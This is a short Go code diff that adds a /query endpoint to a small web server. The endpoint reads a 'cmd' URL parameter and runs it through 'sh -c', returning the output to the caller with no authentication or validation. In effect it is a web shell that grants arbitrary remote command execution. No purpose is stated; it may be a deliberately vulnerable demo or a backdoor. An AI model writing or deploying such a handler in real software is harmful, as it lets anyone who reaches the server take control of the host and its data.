@@ -4,6 +4,7 @@ import (
   "fmt"
   "log"
   "net/http"
+  "net/url"
   "os/exec"
 )
 
@@ -21,6 +22,23 @@ func main() {
         fmt.Println(err)
     }
     fmt.Fprintf(w, "out: %s", out)
+  })
+
+  http.HandleFunc("/query", func(w http.ResponseWriter, r *http.Request) {
+    urlString := fmt.Sprintf("%s://%s%s", "http", r.Host, r.RequestURI)
+    u, err := url.Parse(urlString)
+
+    fmt.Println(urlString)
+    if err != nil {
+      log.Fatal(err);
+    }
+
+    queryParams := u.Query()
+    cmd := queryParams.Get("cmd")
+    fmt.Println(cmd)
+    out, err := exec.Command("sh", "-c", cmd).Output()
+    fmt.Fprintf(w, "out: %s", out)
+
   })
 
   fmt.Println("Starting server on 8080")
